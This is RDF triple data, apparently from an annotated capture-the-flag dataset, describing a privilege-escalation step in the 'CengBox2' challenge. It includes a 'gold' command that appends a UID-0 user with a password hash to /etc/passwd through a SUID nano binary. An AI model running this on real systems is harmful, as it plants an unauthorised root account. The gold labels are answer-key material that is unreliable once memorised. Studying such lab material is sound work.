<https://example.org/bracegreen/ctf#step_CengBox2_17> <https://example.org/bracegreen/ctf#part_of> <https://example.org/bracegreen/ctf#challenge_CengBox2> .
<https://example.org/bracegreen/ctf#step_CengBox2_17> <https://example.org/bracegreen/ctf#has_tactic> <http://attack.mitre.org/tactics#Privilege_Escalation> .
<https://example.org/bracegreen/ctf#step_CengBox2_17> <https://example.org/bracegreen/ctf#has_goal> "Add new root-privileged user to /etc/passwd" .
<https://example.org/bracegreen/ctf#step_CengBox2_17> <https://example.org/bracegreen/ctf#is_optional> "false"^^<http://www.w3.org/2001/XMLSchema#boolean> .
<https://example.org/bracegreen/ctf#step_CengBox2_17> <https://example.org/bracegreen/ctf#has_cmd> <https://example.org/bracegreen/ctf#cmd_CengBox2_17_gold> .
<https://example.org/bracegreen/ctf#step_CengBox2_17> <https://example.org/bracegreen/ctf#requires> "SUID nano binary available" .
<https://example.org/bracegreen/ctf#step_CengBox2_17> <https://example.org/bracegreen/ctf#requires> "Password hash generated for new user" .
<https://example.org/bracegreen/ctf#step_CengBox2_17> <https://example.org/bracegreen/ctf#next_step> <https://example.org/bracegreen/ctf#step_CengBox2_18> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_17_gold> <http://www.w3.org/1999/02/22-rdf-syntax-ns#type> <https://example.org/bracegreen/ctf#Command> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_17_gold> <https://example.org/bracegreen/ctf#command_text> "echo 'raj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' >> /etc/passwd" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_17_gold> <https://example.org/bracegreen/ctf#has_output> "" .
<https://example.org/bracegreen/ctf#cmd_CengBox2_17_gold> <https://example.org/bracegreen/ctf#is_gold> "true"^^<http://www.w3.org/2001/XMLSchema#boolean> .
<https://example.org/bracegreen/ctf#cmd_CengBox2_17_gold> <https://example.org/bracegreen/ctf#has_result> "New user 'raj' added to /etc/passwd with UID 0 (root privileges)" .
<https://example.org/bracegreen/ctf#step_CengBox2_18> <http://www.w3.org/1999/02/22-rdf-syntax-ns#type> <https://example.org/bracegreen/ctf#Step> .
